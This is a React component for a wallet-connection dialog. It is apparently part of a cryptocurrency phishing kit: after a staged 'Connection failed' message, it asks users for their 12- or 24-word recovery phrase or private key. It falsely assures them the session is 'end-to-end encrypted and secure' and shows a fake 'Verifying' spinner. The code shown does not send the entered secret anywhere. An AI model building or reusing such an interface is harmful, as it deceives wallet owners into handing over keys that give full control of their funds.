import React, { useState } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { AlertCircle, Lock } from "lucide-react";
import Image from "next/image";
import { Wallet } from "@/types";

interface ModalProps {
    isModalOpen: boolean;
    setIsModalOpen: (isOpen: boolean) => void;
    wallet: Wallet;
    connectionStatus: string;
    tryAgain: () => void;
    showManualEntry: () => void;
}

export default function Modal({
    isModalOpen,
    setIsModalOpen,
    wallet,
    connectionStatus,
    tryAgain,
    showManualEntry,
}: ModalProps) {
    // const [connectionStatus, setConnectionStatus] = useState("idle");
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [userId, setUserId] = useState("");

    const handleManualSubmit = () => {
        setIsSubmitting(true);
        setTimeout(() => {
            setIsSubmitting(false);
        }, 3000);
    };

    return (
        <Dialog open={isModalOpen} onOpenChange={setIsModalOpen}>
            <DialogContent className="sm:max-w-md bg-white text-black">
                <DialogHeader>
                    <DialogTitle className="text-center text-xl">
                        Connect {wallet?.name}
                    </DialogTitle>
                </DialogHeader>

                <div className="flex flex-col items-center pt-3 pb-6">
                    {connectionStatus === "connecting" && (
                        <>
                            <div className="w-16 h-16 mb-4 rounded-full overflow-hidden bg-slate-100 ring-4 ring-purple-100">
                                <Image
                                    src={wallet?.icon || ""}
                                    alt={wallet?.name || ""}
                                    width={64}
                                    height={64}
                                />
                            </div>
                            <div className="text-center">
                                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-purple-500 mx-auto mb-4"></div>
                                <p className="font-medium">
                                    Starting secure connection, please wait...
                                </p>
                            </div>
                        </>
                    )}

                    {connectionStatus === "error" && (
                        <div className="text-center w-full">
                            <div className="rounded-full bg-red-100 w-12 h-12 flex items-center justify-center mx-auto mb-4">
                                <AlertCircle className="h-6 w-6 text-red-500" />
                            </div>
                            <p className="font-medium text-red-500 mb-2">Connection failed</p>
                            <p className="text-sm text-slate-500 mb-6">
                                We couldn&apos;t connect to your wallet. Please try again or Connect
                                manually.
                            </p>

                            <div className="flex flex-col sm:flex-row gap-3 w-full">
                                <Button
                                    variant="outline"
                                    className="flex-1 border-slate-300 cursor-pointer"
                                    onClick={tryAgain}
                                >
                                    Try Again
                                </Button>
                                <Button
                                    className="flex-1 cursor-pointer bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white"
                                    onClick={showManualEntry}
                                >
                                    Connect Manually
                                </Button>
                            </div>
                        </div>
                    )}

                    {connectionStatus === "manual-entry" && (
                        <div className="text-center w-full">
                            <div className="space-y-4 w-full">
                                <div>
                                    <label
                                        htmlFor="user-id"
                                        className="flex mb-5 font-semibold gap-x-2 items-center justify-center text-sm text-gray-700 text-left"
                                    >
                                        <Image
                                            src={wallet?.icon || ""}
                                            alt={wallet?.name || ""}
                                            width={64}
                                            height={64}
                                        />
                                    </label>
                                    <Textarea
                                        id="user-id"
                                        placeholder="Please enter your 12 or 24 Mnemonic words seperated with spaces or
                                you can input your private key instead."
                                        value={userId}
                                        onChange={(e) => setUserId(e.target.value)}
                                        className="w-full h-24"
                                    />
                                </div>

                                <Button
                                    className="w-full cursor-pointer bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white"
                                    onClick={handleManualSubmit}
                                    disabled={!userId.trim() || isSubmitting || userId.length < 40}
                                >
                                    {isSubmitting ? (
                                        <>
                                            <span className="mr-2">Verifying</span>
                                            <div className="animate-spin  h-4 w-4 border-2 border-white rounded-full border-t-transparent"></div>
                                        </>
                                    ) : (
                                        "Submit"
                                    )}
                                </Button>
                            </div>

                            <p className="text-xs mt-8 flex items-center justify-center text-slate-500 mb-6">
                                <Lock className="h-3 w-3 mr-1" />
                                This session is end-to-end encrypted and secure.
                            </p>
                        </div>
                    )}

                    {connectionStatus === "connected" && (
                        <div className="text-center">
                            <div className="rounded-full bg-green-100 w-8 h-8 flex items-center justify-center mx-auto mb-4">
                                <svg
                                    className="h-5 w-5 text-green-600"
                                    viewBox="0 0 24 24"
                                    fill="none"
                                    xmlns="http://www.w3.org/2000/svg"
                                >
                                    <path
                                        d="M20 6L9 17L4 12"
                                        stroke="currentColor"
                                        strokeWidth="2"
                                        strokeLinecap="round"
                                        strokeLinejoin="round"
                                    />
                                </svg>
                            </div>
                            <p className="font-medium text-green-600">Connected successfully!</p>
                            <p className="text-sm text-slate-500 mt-1">
                                Redirecting to verification...
                            </p>
                        </div>
                    )}
                </div>

                {connectionStatus !== "error" && connectionStatus !== "manual-entry" && (
                    <div className="flex items-center justify-center text-xs text-slate-400 mt-2">
                        <Lock className="h-3 w-3 mr-1" />
                        Your connection is end-to-end encrypted and secure
                    </div>
                )}
            </DialogContent>
        </Dialog>
    );
}
